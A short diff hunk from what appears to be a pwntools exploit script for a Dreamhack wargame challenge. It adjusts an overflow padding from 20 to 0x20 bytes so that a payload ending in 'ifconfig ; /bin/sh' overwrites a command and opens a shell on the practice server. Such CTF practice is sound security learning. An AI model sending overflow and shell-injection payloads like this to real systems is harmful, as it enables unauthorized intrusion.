@@ -59,7 +59,7 @@
 
   p=remote('host3.dreamhack.games', 23902)
 
-  payload = b'a'*20 + b'ifconfig ; /bin/sh'
+  payload = b'a'*0x20 + b'ifconfig ; /bin/sh'
 
   p.sendafter(b'name: ', payload)
 
